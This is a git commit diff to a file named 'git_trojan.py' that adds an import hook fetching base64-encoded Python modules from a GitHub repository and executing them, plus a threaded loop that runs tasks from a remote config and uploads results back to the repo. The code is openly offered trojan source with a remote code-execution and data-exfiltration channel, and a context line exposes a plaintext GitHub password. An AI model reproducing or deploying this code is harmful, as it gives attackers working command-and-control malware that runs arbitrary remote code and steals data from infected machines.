554b63ad9b8e21f16930233c0c266329dec05a5f
jaceklewandowski <jalewandowsk12@gmail.com>
2016-10-07 17:39:30 +0200

    Update git_trojan.py

--- git_trojan.py
+++ git_trojan.py
@@ -18,6 +18,30 @@ trojan_modules =[]
 task_queue = Queue.Queue()
 configured = FALSE
 
+class GitImporter(object):
+
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self,fullname,path=None):
+        if configured:
+            print "[*] Attempting to retrieve %s" % fullname
+            new_library = get_file_contents("modules/%s" % fullname)
+
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+        return None
+    
+    def load_module(self,name):
+        
+        module = imp.new_module(name)
+        exec self.current_module_code in module.__dict__
+        sys.modules[name] = module
+        
+        return module
+
+
 
 def connect_to_github():
     gh = login(username="jaceklewandowski",password="Sandra22308")
@@ -57,3 +81,32 @@ def store_module_result(data):
     repo.create_file(remote_path,"Commit message",base64.b64encode(data))
 
     return
+
+
+def module_runner(module):
+
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+    
+    # store the result in our repo
+    store_module_result(result)
+    
+    return
+
+
+# main trojan loop    
+sys.meta_path = [GitImporter()]
+
+while True:
+    
+    if task_queue.empty():
+
+        config = get_trojan_config()
+        
+        for task in config:
+            t = threading.Thread(target=module_runner,args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1,10))
+            
+time.sleep(random.randint(1000,10000))
